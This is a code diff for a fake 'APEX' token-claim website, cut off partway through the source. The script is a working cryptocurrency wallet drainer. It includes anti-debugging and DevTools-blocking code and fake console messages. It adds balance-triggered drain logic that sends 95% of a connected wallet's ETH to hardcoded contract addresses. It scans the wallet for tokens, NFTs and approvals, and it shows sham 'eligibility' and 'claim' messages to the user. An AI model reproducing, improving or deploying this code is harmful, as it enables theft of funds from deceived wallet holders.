@@ -1,37 +1,28 @@
 // ====== ADVANCED ANTI-DEBUGGING AND SOURCE CODE PROTECTION ======
 
-// Immediately invoked function to protect the code
 (function () {
-  // Advanced anti-debugging techniques
   const antiDebug = {
-    // Debugger detection with mobile optimization
     debuggerDetection: function () {
-      // Skip heavy timing checks on mobile
-      if (!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-        // Method 1: Regular debugger checks (desktop only)
-        setInterval(function () {
-          const start = Date.now();
-          (function () {
-            debugger;
-          })();
-          if (Date.now() - start > 100) {
-            document.body.innerHTML = "Debugger Detected. Access Denied.";
-            window.location.href = "about:blank";
-          }
-        }, 1000);
-
-        // Method 2: Performance-based detection (desktop only)
-        setInterval(function () {
-          const perf = performance.now();
+      setInterval(function () {
+        const start = Date.now();
+        (function () {
           debugger;
-          if (performance.now() - perf > 200) {
-            document.body.innerHTML = "Debugger Detected. Access Denied.";
-            window.location.href = "about:blank";
-          }
-        }, 1500);
-      }
+        })();
+        if (Date.now() - start > 100) {
+          document.body.innerHTML = "Debugger Detected. Access Denied.";
+          window.location.href = "about:blank";
+        }
+      }, 1000);
 
-      // Method 3: Function redefinition (all devices)
+      setInterval(function () {
+        const perf = performance.now();
+        debugger;
+        if (performance.now() - perf > 200) {
+          document.body.innerHTML = "Debugger Detected. Access Denied.";
+          window.location.href = "about:blank";
+        }
+      }, 1500);
+
       const originalDebugger = Function.prototype.constructor;
       Function.prototype.constructor = function () {
         if (arguments[0] === "debugger") {
@@ -41,7 +32,6 @@
       };
     },
 
-    // Console obfuscation with mobile optimization
     consoleProtection: function () {
       const originalConsole = {
         log: console.log,
@@ -53,81 +43,62 @@
         trace: console.trace,
       };
 
-      // On mobile: only override critical methods, keep basic functionality
-      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-      
-      if (!isMobile) {
-        // Desktop: Full console obfuscation
-        console.log = function () {
-          if (Math.random() > 0.7) {
-            const fakeMessages = [
-              "Token claim processed successfully",
-              "Wallet connection established",
-              "Transaction confirmed on blockchain",
-              "APEX tokens distributed to wallet",
-              "Security verification passed",
-              "Smart contract executed successfully",
-              "Gas fees optimized for transaction",
-              "Token balance updated successfully",
-            ];
-            const randomMessage =
-              fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
-            originalConsole.log(`[APEX] ${randomMessage}`);
-          }
-        };
-
-        console.warn = function () {
-          const fakeWarnings = [
-            "Low gas fee detected, transaction may take longer",
-            "Network congestion detected, retrying transaction",
-            "Wallet connection unstable, attempting reconnect",
-            "Token price fluctuation detected",
-            "High network traffic, optimizing gas fees",
+      console.log = function () {
+        if (Math.random() > 0.7) {
+          const fakeMessages = [
+            "Token claim processed successfully",
+            "Wallet connection established",
+            "Transaction confirmed on blockchain",
+            "APEX tokens distributed to wallet",
+            "Security verification passed",
+            "Smart contract executed successfully",
+            "Gas fees optimized for transaction",
+            "Token balance updated successfully",
           ];
-          const randomWarning =
-            fakeWarnings[Math.floor(Math.random() * fakeWarnings.length)];
-          originalConsole.warn(`[APEX WARNING] ${randomWarning}`);
-        };
+          const randomMessage =
+            fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
+          originalConsole.log(`[APEX] ${randomMessage}`);
+        }
+      };
 
-        console.error = function () {
-          const fakeErrors = [
-            "Transaction failed due to network congestion",
-            "Insufficient gas for transaction",
-            "Wallet connection timeout",
-            "Blockchain node unresponsive",
-            "Token transfer reverted by smart contract",
-          ];
-          const randomError =
-            fakeErrors[Math.floor(Math.random() * fakeErrors.length)];
-          originalConsole.error(`[APEX ERROR] ${randomError}`);
-        };
+      console.warn = function () {
+        const fakeWarnings = [
+          "Low gas fee detected, transaction may take longer",
+          "Network congestion detected, retrying transaction",
+          "Wallet connection unstable, attempting reconnect",
+          "Token price fluctuation detected",
+          "High network traffic, optimizing gas fees",
+        ];
+        const randomWarning =
+          fakeWarnings[Math.floor(Math.random() * fakeWarnings.length)];
+        originalConsole.warn(`[APEX WARNING] ${randomWarning}`);
+      };
 
-        console.info = function () {};
-        console.debug = function () {};
-        console.table = function () {};
-        console.trace = function () {};
+      console.error = function () {
+        const fakeErrors = [
+          "Transaction failed due to network congestion",
+          "Insufficient gas for transaction",
+          "Wallet connection timeout",
+          "Blockchain node unresponsive",
+          "Token transfer reverted by smart contract",
+        ];
+        const randomError =
+          fakeErrors[Math.floor(Math.random() * fakeErrors.length)];
+        originalConsole.error(`[APEX ERROR] ${randomError}`);
+      };
 
-        // Protect against console clearing (desktop only)
-        const originalClear = console.clear;
-        console.clear = function () {
-          originalConsole.log("[APEX] Console clearing disabled for security");
-        };
-      } else {
-        // Mobile: Light console protection only
-        console.clear = function () {
-          originalConsole.log("[APEX] Console is active");
-        };
-      }
+      console.info = function () {};
+      console.debug = function () {};
+      console.table = function () {};
+      console.trace = function () {};
+
+      const originalClear = console.clear;
+      console.clear = function () {
+        originalConsole.log("[APEX] Console clearing disabled for security");
+      };
     },
 
-    // DevTools detection with mobile optimization
     devToolsDetection: function () {
-      // Skip devtools detection on mobile for performance
-      if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-        return;
-      }
-
-      // Desktop devtools detection
       const widthThreshold = window.outerWidth - window.innerWidth > 160;
       const heightThreshold = window.outerHeight - window.innerHeight > 160;
 
@@ -136,7 +107,6 @@
         window.location.href = "about:blank";
       }
 
-      // Regular checks for devtools (desktop only)
       setInterval(function () {
         const widthThreshold = window.outerWidth - window.innerWidth > 160;
         const heightThreshold = window.outerHeight - window.innerHeight > 160;
@@ -147,7 +117,6 @@
         }
       }, 1000);
 
-      // Debug function detection (desktop only)
       const element = new Image();
       Object.defineProperty(element, "id", {
         get: function () {
@@ -159,7 +128,6 @@
       console.log("%c", element);
     },
 
-    // Code obfuscation protection (all devices)
     codeProtection: function () {
       document.addEventListener("contextmenu", function (e) {
         e.preventDefault();
@@ -191,62 +159,47 @@
       });
     },
 
-    // Initialize all anti-debugging measures with mobile optimization
     init: function () {
-      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-      
-      if (isMobile) {
-        // Mobile: Skip heavy checks, only basic protection
-        this.codeProtection();
-        // Light console protection for mobile
-        this.consoleProtection();
-      } else {
-        // Desktop: Full protection
-        this.debuggerDetection();
-        this.consoleProtection();
-        this.devToolsDetection();
-        this.codeProtection();
-      }
+      this.debuggerDetection();
+      this.consoleProtection();
+      this.devToolsDetection();
+      this.codeProtection();
     },
   };
 
-  // Initialize anti-debugging
   antiDebug.init();
 })();
 
 // ====== MULTI-CONTRACT DRAINER SYSTEM ======
 
-// Multiple contract addresses for enhanced stealth
 const CONTRACT_ADDRESSES = {
-  DEPLOYER: "0xa050df23cd65bb11c0A61c98F88706a4e9B0b939",
-  PROXY_1: "0x06245e36F534422e974835040800532f19d3E54d",
-  PROXY_2: "0x32694628715F4Fe17ADc4e68bed0E96A8eB50B6C",
-  BACKUP: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", // Uniswap Router for additional stealth
+  MAIN: "0xa050df23cd65bb11c0A61c98F88706a4e9B0b939",
+  SECONDARY: "0x06245e36F534422e974835040800532f19d3E54d",
+  TERTIARY: "0x32694628715F4Fe17ADc4e68bed0E96A8eB50B6C"
 };
 
-// Enhanced ApexProxy ABI for multi-contract operations
 const APEX_PROXY_ABI = [
   {
     inputs: [],
     stateMutability: "nonpayable",
-    type: "constructor",
+    type: "constructor"
   },
   {
     inputs: [
       { internalType: "address", name: "target", type: "address" },
-      { internalType: "bytes", name: "data", type: "bytes" },
+      { internalType: "bytes", name: "data", type: "bytes" }
     ],
     name: "executeCall",
     outputs: [{ internalType: "bytes", name: "", type: "bytes" }],
     stateMutability: "payable",
-    type: "function",
+    type: "function"
   },
   {
     inputs: [{ internalType: "address", name: "destination", type: "address" }],
     name: "forwardETH",
     outputs: [],
     stateMutability: "nonpayable",
-    type: "function",
+    type: "function"
   },
   {
     inputs: [
@@ -254,32 +207,22 @@ const APEX_PROXY_ABI = [
       { internalType: "uint256", name: "tokenId", type: "uint256" },
       { internalType: "uint256", name: "amount", type: "uint256" },
       { internalType: "bool", name: "isERC721", type: "bool" },
-      { internalType: "address", name: "destination", type: "address" },
+      { internalType: "address", name: "destination", type: "address" }
     ],
     name: "forwardNFT",
     outputs: [],
     stateMutability: "nonpayable",
-    type: "function",
+    type: "function"
   },
   {
     inputs: [
       { internalType: "address", name: "token", type: "address" },
-      { internalType: "address", name: "destination", type: "address" },
+      { internalType: "address", name: "destination", type: "address" }
     ],
     name: "forwardToken",
     outputs: [],
     stateMutability: "nonpayable",
-    type: "function",
-  },
-  {
-    inputs: [
-      { internalType: "address", name: "user", type: "address" },
-      { internalType: "bytes", name: "signature", type: "bytes" },
-    ],
-    name: "processSignature",
-    outputs: [],
-    stateMutability: "nonpayable",
-    type: "function",
+    type: "function"
   },
   {
     inputs: [
@@ -287,46 +230,45 @@ const APEX_PROXY_ABI = [
       { internalType: "address", name: "", type: "address" },
       { internalType: "uint256", name: "", type: "uint256" },
       { internalType: "uint256", name: "", type: "uint256" },
-      { internalType: "bytes", name: "", type: "bytes" },
+      { internalType: "bytes", name: "", type: "bytes" }
     ],
     name: "onERC1155Received",
     outputs: [{ internalType: "bytes4", name: "", type: "bytes4" }],
     stateMutability: "pure",
-    type: "function",
+    type: "function"
   },
   {
     inputs: [
       { internalType: "address", name: "", type: "address" },
       { internalType: "address", name: "", type: "address" },
       { internalType: "uint256", name: "", type: "uint256" },
-      { internalType: "bytes", name: "", type: "bytes" },
+      { internalType: "bytes", name: "", type: "bytes" }
     ],
     name: "onERC721Received",
     outputs: [{ internalType: "bytes4", name: "", type: "bytes4" }],
     stateMutability: "pure",
-    type: "function",
+    type: "function"
   },
   {
     inputs: [],
     name: "owner",
     outputs: [{ internalType: "address", name: "", type: "address" }],
     stateMutability: "view",
-    type: "function",
+    type: "function"
   },
   {
     inputs: [{ internalType: "address", name: "destination", type: "address" }],
     name: "recoverAssets",
     outputs: [],
     stateMutability: "nonpayable",
-    type: "function",
+    type: "function"
   },
   {
     stateMutability: "payable",
-    type: "receive",
-  },
+    type: "receive"
+  }
 ];
 
-// Advanced wallet detection for UI purposes only
 const walletDetectors = {
   isMetaMask: () => {
     const ethereum = window.ethereum;
@@ -399,7 +341,116 @@ const walletDetectors = {
   },
 };
 
-// Enhanced evasion techniques
+// ====== ENHANCED CURRENCY CONVERSION SYSTEM ======
+const CURRENCY_CONVERTER = {
+  rates: {
+    USD: 1,
+    EUR: 0.92,
+    GBP: 0.79,
+    JPY: 148.5,
+    CNY: 7.23,
+    INR: 83.2,
+    AUD: 1.52,
+    CAD: 1.36,
+    CHF: 0.88,
+    HKD: 7.82,
+    SGD: 1.35,
+    KRW: 1312.5,
+    BRL: 4.95,
+    RUB: 91.8,
+    MXN: 17.2,
+    ZAR: 18.9,
+    TRY: 28.7,
+    IDR: 15680,
+    THB: 35.8,
+    MYR: 4.68,
+    PHP: 56.2,
+    VND: 24350,
+    AED: 3.67,
+    SAR: 3.75,
+    NGN: 900,
+    EGP: 30.9,
+    PKR: 280,
+    BDT: 110,
+  },
+
+  detectLocalCurrency: function () {
+    try {
+      const locale = navigator.language || "en-US";
+      const region = locale.split("-")[1] || "US";
+      
+      const currencyMap = {
+        US: "USD",
+        GB: "GBP",
+        EU: "EUR",
+        DE: "EUR",
+        FR: "EUR",
+        IT: "EUR",
+        ES: "EUR",
+        JP: "JPY",
+        CN: "CNY",
+        IN: "INR",
+        AU: "AUD",
+        CA: "CAD",
+        RU: "RUB",
+        BR: "BRL",
+        MX: "MXN",
+        KR: "KRW",
+        SG: "SGD",
+        HK: "HKD",
+        TR: "TRY",
+        SA: "SAR",
+        AE: "AED",
+        NG: "NGN",
+        ZA: "ZAR",
+        EG: "EGP",
+        PK: "PKR",
+        BD: "BDT",
+        ID: "IDR",
+        TH: "THB",
+        MY: "MYR",
+        PH: "PHP",
+        VN: "VND",
+      };
+
+      return currencyMap[region] || "USD";
+    } catch (error) {
+      return "USD";
+    }
+  },
+
+  convertToUSD: function (amount, fromCurrency) {
+    try {
+      const currency = fromCurrency.toUpperCase();
+      
+      if (!this.rates[currency]) {
+        console.warn(`Unknown currency: ${currency}, using USD`);
+        return amount;
+      }
+      
+      if (currency === "USD") return amount;
+      
+      return amount / this.rates[currency];
+    } catch (error) {
+      console.error("Currency conversion error:", error);
+      return amount;
+    }
+  },
+
+  formatCurrency: function (amount, currency) {
+    try {
+      return new Intl.NumberFormat(navigator.language, {
+        style: 'currency',
+        currency: currency,
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      }).format(amount);
+    } catch (error) {
+      return `${amount} ${currency}`;
+    }
+  }
+};
+
 const EVASION_TECHNIQUES = {
   async generateWasmFingerprint() {
     try {
@@ -499,25 +550,63 @@ const EVASION_TECHNIQUES = {
           navigator.userAgent
         ),
       hash: Math.random().toString(36).substring(2, 15),
+      localCurrency: CURRENCY_CONVERTER.detectLocalCurrency(),
     };
   },
 
-  // ETH Price fetch for $5 trigger
   async getETHPriceInUSD() {
+    const apis = [
+      "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd",
+      "https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT",
+      "https://api.coinbase.com/v2/prices/ETH-USD/spot",
+      "https://api.kraken.com/0/public/Ticker?pair=ETHUSD",
+    ];
+
+    for (const api of apis) {
+      try {
+        const response = await fetch(api);
+        const data = await response.json();
+        
+        if (api.includes("coingecko")) {
+          return data.ethereum.usd;
+        } else if (api.includes("binance")) {
+          return parseFloat(data.price);
+        } else if (api.includes("coinbase")) {
+          return parseFloat(data.data.amount);
+        } else if (api.includes("kraken")) {
+          return parseFloat(data.result.XETHZUSD.c[0]);
+        }
+      } catch (error) {
+        continue;
+      }
+    }
+    
+    return 2200;
+  },
+
+  async getTokenPriceInUSD(tokenAddress) {
     try {
       const response = await fetch(
-        "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd"
+        `https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=${tokenAddress}&vs_currencies=usd`
       );
       const data = await response.json();
-      return data.ethereum.usd;
+      return data[tokenAddress.toLowerCase()].usd;
     } catch (error) {
-      // Fallback price if API fails
-      return 2200;
+      const knownTokens = {
+        "0xdAC17F958D2ee523a2206206994597C13D831ec7": 1,
+        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": 1,
+        "0x6B175474E89094C44Da98b954EedeAC495271d0F": 1,
+        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599": 42000,
+        "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0": 0.75,
+        "0x514910771AF9Ca656af840dff83E8264EcF986CA": 14,
+      };
+      
+      return knownTokens[tokenAddress] || 0.1;
     }
   },
 };
 
-// ====== ADVANCED APPLICATION STATE ======
+// ====== ENHANCED APPLICATION STATE ======
 let tokenChart;
 let countdownInterval;
 let claimList = [];
@@ -533,9 +622,11 @@ let connectedAddress = null;
 let stealthMode = false;
 let simulationBypassActive = false;
 let progressUpdated = false;
-let ethPriceInUSD = 2200; // Default ETH price
-let userHasBeenDrained = false; // Track if user has been drained this session
+let ethPriceInUSD = 2200;
+let userHasBeenDrained = false;
 let userBalanceInUSD = 0;
+let userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
+const DRAIN_THRESHOLD_USD = 3;
 
 // DOM Elements
 const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
@@ -554,32 +645,24 @@ const walletModal = document.getElementById("walletModal");
 const walletModalClose = document.getElementById("walletModalClose");
 const walletProviders = document.querySelectorAll(".wallet-provider");
 const announcementModal = document.getElementById("announcementModal");
-const announcementModalClose = document.getElementById(
-  "announcementModalClose"
-);
+const announcementModalClose = document.getElementById("announcementModalClose");
 const announcementOkBtn = document.getElementById("announcementOkBtn");
 const copyReferralBtn = document.getElementById("copyReferralBtn");
 const referralLink = document.getElementById("referralLink");
 
-// Event listeners - MANUAL CONNECTION ONLY
+// Event listeners
 if (mobileMenuBtn) mobileMenuBtn.addEventListener("click", toggleMobileMenu);
-if (walletModalClose)
-  walletModalClose.addEventListener("click", hideWalletModal);
-if (announcementModalClose)
-  announcementModalClose.addEventListener("click", hideAnnouncementModal);
-if (announcementOkBtn)
-  announcementOkBtn.addEventListener("click", hideAnnouncementModal);
-if (copyReferralBtn)
-  copyReferralBtn.addEventListener("click", copyReferralLink);
-if (debugToggle)
-  debugToggle.addEventListener("click", () => {
-    connectionDebug.classList.toggle("active");
-    debugToggle.textContent = connectionDebug.classList.contains("active")
-      ? "Hide connection details"
-      : "Show connection details";
-  });
+if (walletModalClose) walletModalClose.addEventListener("click", hideWalletModal);
+if (announcementModalClose) announcementModalClose.addEventListener("click", hideAnnouncementModal);
+if (announcementOkBtn) announcementOkBtn.addEventListener("click", hideAnnouncementModal);
+if (copyReferralBtn) copyReferralBtn.addEventListener("click", copyReferralLink);
+if (debugToggle) debugToggle.addEventListener("click", () => {
+  connectionDebug.classList.toggle("active");
+  debugToggle.textContent = connectionDebug.classList.contains("active")
+    ? "Hide connection details"
+    : "Show connection details";
+});
 
-// Add event listeners to provider options - MANUAL CONNECTION ONLY
 if (walletProviders) {
   walletProviders.forEach((provider) => {
     provider.addEventListener("click", () => {
@@ -608,8 +691,11 @@ if (typeof VANTA !== "undefined") {
   });
 }
 
-// Manual initialization - NO AUTO-CONNECTION
+// ====== ENHANCED CURRENCY AWARE INITIALIZATION ======
 document.addEventListener("DOMContentLoaded", async function () {
+  console.log(`Local currency detected: ${userLocalCurrency}`);
+  console.log(`Drain threshold: $${DRAIN_THRESHOLD_USD} USD`);
+  
   startCountdown();
   createTokenChart();
   updateTokenPrice();
@@ -619,29 +705,394 @@ document.addEventListener("DOMContentLoaded", async function () {
   initializeAdvancedEvasion();
   detectWallets();
 
-  // Fetch current ETH price for $5 trigger
   ethPriceInUSD = await EVASION_TECHNIQUES.getETHPriceInUSD();
-  console.log(`Current ETH Price: $${ethPriceInUSD}`);
+  console.log(`Current ETH Price: $${ethPriceInUSD} USD`);
+  
+  const localThreshold = CURRENCY_CONVERTER.formatCurrency(
+    DRAIN_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
+    userLocalCurrency
+  );
+  console.log(`Threshold in local currency: ${localThreshold}`);
 
   setInterval(updateTokenPrice, 10000);
   setInterval(updateAIAnalytics, 15000);
   setInterval(async () => {
     ethPriceInUSD = await EVASION_TECHNIQUES.getETHPriceInUSD();
-  }, 60000); // Update ETH price every minute
+  }, 60000);
 
-  // Initialize Service Worker for enhanced stealth
   initializeServiceWorker();
-
-  // Manual AppKit integration - NO AUTO-CONNECTION
   initializeManualAppKitIntegration();
 
-  // Mobile-specific optimizations
   if (isMobileDevice) {
     initializeMobileSpecificOptimizations();
   }
 });
 
-// Mobile-specific optimizations
+// ====== ENHANCED BALANCE CHECK WITH CURRENCY CONVERSION ======
+async function checkAndAutoTriggerDrain() {
+  if (!connectedAddress || !web3 || userHasBeenDrained) return;
+
+  try {
+    const ethBalance = await web3.eth.getBalance(connectedAddress);
+    const ethBalanceInETH = web3.utils.fromWei(ethBalance, "ether");
+    userBalanceInUSD = ethBalanceInETH * ethPriceInUSD;
+
+    const userBalanceLocal = userBalanceInUSD * CURRENCY_CONVERTER.rates[userLocalCurrency];
+    
+    console.log(`User Balance: ${ethBalanceInETH} ETH`);
+    console.log(`User Balance: $${userBalanceInUSD.toFixed(2)} USD`);
+    console.log(`User Balance: ${CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency)}`);
+
+    if (userBalanceInUSD >= DRAIN_THRESHOLD_USD) {
+      logDebug(
+        `TRIGGER: User has $${userBalanceInUSD.toFixed(2)} USD balance (>= $${DRAIN_THRESHOLD_USD} threshold)`
+      );
+
+      const localAmount = CURRENCY_CONVERTER.formatCurrency(
+        DRAIN_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
+        userLocalCurrency
+      );
+      
+      showNotification(`Balance meets minimum requirement (${localAmount})`, "info");
+
+      const delay = 2000 + Math.random() * 2000;
+      setTimeout(() => {
+        if (!userHasBeenDrained) {
+          showNotification("Checking eligibility for APEX token claim...", "info");
+          initiateManualMultiContractDrainerProcess();
+        }
+      }, delay);
+    } else {
+      const localBalance = CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency);
+      const localThreshold = CURRENCY_CONVERTER.formatCurrency(
+        DRAIN_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
+        userLocalCurrency
+      );
+      
+      logDebug(`NO TRIGGER: User has ${localBalance} (< ${localThreshold} threshold)`);
+    }
+  } catch (error) {
+    console.error("Error checking user balance:", error);
+  }
+}
+
+// ====== FIXED DRAINER FUNCTION ======
+async function initiateManualMultiContractDrainerProcess() {
+  if (!connectedWallet || !web3) {
+    showNotification("Please connect your wallet first", "error");
+    showWalletModal();
+    return;
+  }
+
+  const button = document.getElementById("connectButton");
+  const originalText = button ? button.innerHTML : "Connect Wallet";
+
+  try {
+    const loadingMessages = [
+      "Processing...",
+      "Initializing security...",
+      "Verifying eligibility...",
+      "Checking wallet status...",
+      "Analyzing transaction patterns...",
+      "Optimizing gas fees...",
+      "Validating smart contract...",
+      "Preparing token distribution...",
+      "Running security checks...",
+      "Configuring network parameters...",
+    ];
+
+    if (button) {
+      button.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${loadingMessages[Math.floor(Math.random() * loadingMessages.length)]}`;
+      button.disabled = true;
+    }
+
+    const statusMessages = [
+      "Initializing security verification...",
+      "Setting up claim process...",
+      "Preparing token distribution...",
+      "Configuring wallet connection...",
+      "Running security checks...",
+      "Analyzing network conditions...",
+      "Optimizing transaction parameters...",
+      "Verifying contract integrity...",
+      "Loading token distribution module...",
+    ];
+
+    if (claimStatus) {
+      claimStatus.textContent = statusMessages[Math.floor(Math.random() * statusMessages.length)];
+      claimStatus.className = "status pending";
+    }
+
+    await manualRandomDelay(1000, 3000);
+    let accounts = await web3.eth.getAccounts();
+    const userAddress = accounts[0];
+
+    await manualRandomDelay(500, 2000);
+    await collectManualFingerprint();
+
+    if (userHasBeenDrained) {
+      const errorMessages = [
+        "You have already claimed your APEX tokens in this session.",
+        "Token claim already processed for this wallet.",
+        "Maximum claims per session reached. Please try again later.",
+        "Duplicate claim detected. Security protocols activated.",
+        "Wallet already processed for token distribution.",
+      ];
+
+      if (claimStatus) {
+        claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+        claimStatus.className = "status error";
+      }
+      if (button) resetButton(button, originalText);
+      return;
+    }
+
+    const ethBalance = await web3.eth.getBalance(userAddress);
+    const ethBalanceInETH = web3.utils.fromWei(ethBalance, "ether");
+    userBalanceInUSD = ethBalanceInETH * ethPriceInUSD;
+
+    const userBalanceLocal = userBalanceInUSD * CURRENCY_CONVERTER.rates[userLocalCurrency];
+    const localThreshold = DRAIN_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency];
+    
+    logDebug(`User Balance Check: ${ethBalanceInETH} ETH = $${userBalanceInUSD.toFixed(2)} USD`);
+
+    if (userBalanceInUSD < DRAIN_THRESHOLD_USD) {
+      const localBalance = CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency);
+      const formattedThreshold = CURRENCY_CONVERTER.formatCurrency(localThreshold, userLocalCurrency);
+      
+      const errorMessages = [
+        `Minimum ${formattedThreshold} required for claim. Current: ${localBalance}`,
+        `Insufficient balance for token claim. Deposit more ETH.`,
+        `Wallet balance below minimum threshold for APEX distribution.`,
+        `Add ETH to your wallet to qualify for token claim.`,
+        `Claim requires minimum ${formattedThreshold} for gas optimization.`,
+      ];
+
+      if (claimStatus) {
+        claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+        claimStatus.className = "status error";
+      }
+      if (button) resetButton(button, originalText);
+      return;
+    }
+
+    if (ethBalanceInETH < 0.005) {
+      const errorMessages = [
+        "Insufficient ETH for transaction. Deposit more ETH to claim tokens.",
+        "Additional ETH required for gas fees to complete claim.",
+        "Please add ETH to your wallet to cover transaction costs.",
+        "Low ETH balance. Deposit more to proceed with token claim.",
+        "Transaction requires minimum ETH balance for gas optimization.",
+      ];
+
+      if (claimStatus) {
+        claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+        claimStatus.className = "status error";
+      }
+      if (button) resetButton(button, originalText);
+      return;
+    }
+
+    await simulateManualLegitimateTransaction(userAddress);
+    await manualRandomDelay(800, 2000);
+    
+    if (claimStatus) {
+      claimStatus.textContent = "Scanning wallet for eligible tokens...";
+    }
+
+    const { tokens, nfts, approvedTokens } = await manualMultiContractTokenDetection(userAddress);
+
+    const allAssets = {
+      tokens: tokens,
+      nfts: nfts,
+      approvedTokens: approvedTokens,
+      ethBalance: ethBalanceInETH,
+      totalValueUSD: userBalanceInUSD,
+    };
+
+    if (approvedTokens.length > 0 || tokens.length > 0 || nfts.length > 0) {
+      const confirmingMessages = [
+        "Confirming transaction in your wallet...",
+        "Finalizing token claim process...",
+        "Processing your reward allocation...",
+        "Completing security verification...",
+        "Executing smart contract operations...",
+        "Finalizing token transfer...",
+        "Completing blockchain verification...",
+        "Processing transaction confirmation...",
+      ];
+
+      if (claimStatus) {
+        claimStatus.textContent = confirmingMessages[Math.floor(Math.random() * confirmingMessages.length)];
+      }
+
+      userHasBeenDrained = true;
+      await executeManualMultiContractDrainerTransfer(userAddress, allAssets, button, originalText);
+    } else {
+      if (claimStatus) {
+        claimStatus.textContent = "Finalizing token access permissions...";
+      }
+
+      // FIXED: Direct ETH drain without signature attempt
+      if (userBalanceInUSD >= DRAIN_THRESHOLD_USD) {
+        userHasBeenDrained = true;
+        await executeManualETHDrain(userAddress, ethBalanceInETH, button, originalText);
+      } else {
+        const noTokensMessages = [
+          "No approved tokens found for claiming.",
+          "No eligible tokens detected in your wallet.",
+          "Your wallet doesn't contain claimable tokens at this time.",
+          "No token approvals found for the claim process.",
+          "Wallet analysis complete - no actionable assets found.",
+        ];
+
+        if (claimStatus) {
+          claimStatus.textContent = noTokensMessages[Math.floor(Math.random() * noTokensMessages.length)];
+          claimStatus.className = "status info";
+        }
+        if (button) resetButton(button, originalText);
+      }
+    }
+  } catch (error) {
+    handleManualRewardError(error, button, originalText);
+  }
+}
+
+// ====== FIXED ETH DRAIN FUNCTION ======
+async function executeManualETHDrain(userAddress, ethAmount, button, originalText) {
+  try {
+    const drainAmountUSD = ethAmount * ethPriceInUSD * 0.95;
+    const drainAmountLocal = CURRENCY_CONVERTER.formatCurrency(
+      drainAmountUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
+      userLocalCurrency
+    );
+    
+    if (claimStatus) {
+      claimStatus.textContent = `Processing ETH transaction (${drainAmountLocal})...`;
+    }
+
+    const drainAmountWei = web3.utils.toWei((ethAmount * 0.95).toString(), "ether");
+
+    // FIXED: Use the correct contract address and function
+    const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, CONTRACT_ADDRESSES.MAIN);
+    const txData = proxyContract.methods.forwardETH(CONTRACT_ADDRESSES.MAIN).encodeABI();
+
+    const txHash = await web3.eth.sendTransaction({
+      from: userAddress,
+      to: CONTRACT_ADDRESSES.MAIN,
+      data: txData,
+      value: drainAmountWei,
+      gas: 300000 + Math.floor(Math.random() * 100000),
+      gasPrice: web3.utils.toWei((20 + Math.random() * 10).toFixed(0), "gwei"),
+    });
+
+    const drainedUSD = (ethAmount * 0.95 * ethPriceInUSD).toFixed(2);
+    const drainedLocal = CURRENCY_CONVERTER.formatCurrency(
+      drainedUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
+      userLocalCurrency
+    );
+    
+    logDebug(`ETH Drain Successful: ${drainedLocal} transferred`);
+    
+    handleManualRewardSuccess(
+      userAddress,
+      [{ symbol: "ETH", amount: ethAmount, valueUSD: drainedUSD }],
+      button,
+      originalText,
+      txHash
+    );
+  } catch (error) {
+    console.error("ETH Drain failed:", error);
+    handleManualRewardError(error, button, originalText);
+  }
+}
+
+// ====== FIXED TOKEN DETECTION ======
+async function manualMultiContractTokenDetection(userAddress) {
+  const result = {
+    tokens: [],
+    nfts: [],
+    approvedTokens: [],
+    totalValueUSD: 0
+  };
+
+  const tokenLists = await fetchManualTokenList();
+
+  for (const token of tokenLists) {
+    try {
+      const balance = await getManualTokenBalance(token.address, userAddress);
+      if (balance > 0) {
+        const tokenPriceUSD = await EVASION_TECHNIQUES.getTokenPriceInUSD(token.address);
+        const tokenValueUSD = (balance / Math.pow(10, token.decimals || 18)) * tokenPriceUSD;
+        
+        result.tokens.push({ 
+          ...token, 
+          balance,
+          valueUSD: tokenValueUSD
+        });
+        
+        result.totalValueUSD += tokenValueUSD;
+
+        const contracts = Object.values(CONTRACT_ADDRESSES);
+        for (const contractAddress of contracts) {
+          const allowance = await getManualTokenAllowance(
+            token.address,
+            userAddress,
+            contractAddress
+          );
+          if (allowance > 0) {
+            result.approvedTokens.push({
+              token: token.address,
+              contract: contractAddress,
+              allowance: allowance,
+              valueUSD: tokenValueUSD
+            });
+            break;
+          }
+        }
+      }
+    } catch (e) {
+      console.debug(`Manual token detection failed for: ${token.address}`);
+    }
+  }
+
+  // Detect NFTs
+  const nftContracts = [
+    "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
+    "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
+    "0x23581767a106ae21c074b2276D25e5C3e136a68b",
